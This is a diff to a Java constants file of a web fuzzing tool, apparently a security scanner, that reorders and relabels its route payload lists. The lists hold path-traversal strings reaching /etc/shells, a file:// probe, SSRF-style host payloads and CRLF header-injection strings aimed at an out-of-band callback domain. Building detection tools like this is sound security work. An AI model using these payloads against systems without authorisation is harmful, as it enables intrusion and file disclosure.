@@ -50,7 +50,7 @@ public class PayloadConstants {
             new PayloadInfo("{param}#", "{param}#"),
             new PayloadInfo("{param}%23", "{param}%23"),
             new PayloadInfo("{param}/../../../../../../../", "{param}/../X7"),
-            new PayloadInfo("{param}%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f", "{param}%2f..X7"),
+            new PayloadInfo("{param}%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f", "{param}%2f..X8"),
             new PayloadInfo("{param}%26chaxx=chax", "{param}%26x=x"),
             new PayloadInfo("file:///etc/shells", "file protocol"),
             new PayloadInfo("{random_8000}", "{random_8000}"),
@@ -63,30 +63,35 @@ public class PayloadConstants {
     /**
      * 路由模糊测试专用的payload列表
      * 注意：这些是默认值，实际使用时应该通过PayloadManager获取启用的payloads
+     *
+     * ROUTE12类型payload（在ROUTE1和ROUTE2标签页中都显示）:
+     * - "chaxx123" -> "chaxx"
+     * - "{path}/chaxx" -> "{path}/chaxx"
      */
     public static final List<PayloadInfo> ROUTE_PAYLOAD_INFOS = Arrays.asList(
-            new PayloadInfo("chaxx123", "chaxx"),
+            new PayloadInfo("chaxx123", "chaxx"),                              // ROUTE12
+            // 其他ROUTE类型payload
 //            new PayloadInfo("chaxx123'\">", "chaxx123'\">"),
             new PayloadInfo("{path}&chaxx=cha", "{param}&chaxx=cha"),
             new PayloadInfo("{path}%26chaxx=cha", "{param}%26chaxx=cha"),
             new PayloadInfo("{path}@{fuzz}.tejq8.zcyy.fun", "{path}@host"),
             new PayloadInfo("{path1}{path2}", "{path1}{path2}"),
             new PayloadInfo("{path}..", "{path}.."),
+            new PayloadInfo("{path}%20HTTP/1.1%0D%0AHost:%20{fuzz}.tejq8.zcyy.fun%0D%0Ac9w:%204", "{path}CRLF"),
+            new PayloadInfo("{path}/chaxx", "{path}/chaxx"),                   // ROUTE12
             new PayloadInfo("{path}/%20H", "ng crlf"),
             new PayloadInfo("{path}/%20HTTP/19.91%0D%0Ac9w:%20x", "ng crlf2"),
             new PayloadInfo("{path}/%20HTTP/1.1%0D%0AHost:%20{fuzz}.tejq8.zcyy.fun%0D%0Ac9w:%209", "ng crlf3"),
-            new PayloadInfo("{path}%20HTTP/1.1%0D%0AHost:%20{fuzz}.tejq8.zcyy.fun%0D%0Ac9w:%204", "{path}CRLF"),
-            new PayloadInfo("{path}/chaxx", "{path}/chaxx"),
+            new PayloadInfo("{path_del}", "{path_del}"), // 新增：删除当前路径段的payload
+            new PayloadInfo("{path}/..%2f", "{path}/..%2f"),
             new PayloadInfo("{path}/..;", "{path}/..;"),
             new PayloadInfo("{path}/..;/..;/..;/..;/..;", "{path}/..;/X5"),
             new PayloadInfo("{path}/../../../../../../../", "{path}/..X7"),
-            new PayloadInfo("{path}%2f..%2f..%2f..%2f..%2f..%2f..%2f..", "{path}%2f..X7"),
+            new PayloadInfo("{path}%2f..%2f..%2f..%2f..%2f..%2f..%2f..", "{path}%2f..X8"),
             new PayloadInfo("{path}\\", "{path}\\"),
             new PayloadInfo("{path}\\..\\..\\", "{path}\\..\\..\\"),
             new PayloadInfo("{path}%5c..%5c..%5c", "{path}%5c..X2"),
             new PayloadInfo("{path}/..%2f..%2f..%2f..%2f..%2f..%2f..", "{path}/..%2fX6"),
-            new PayloadInfo("{path_del}", "{path_del}"), // 新增：删除当前路径段的payload
-            new PayloadInfo("{path}/..%2f", "{path}/..%2f"),
             new PayloadInfo("{path}/..%5c..%5c..%5c..%5c..%5c..%5c..", "{path}/..%5cX6"),
             new PayloadInfo("{path}/..%5c", "{path}/..%5c"),
             new PayloadInfo("{path}/..//..//..//..//..//..//..//..//..//etc//shells", "{path}/..//X9/etc"),
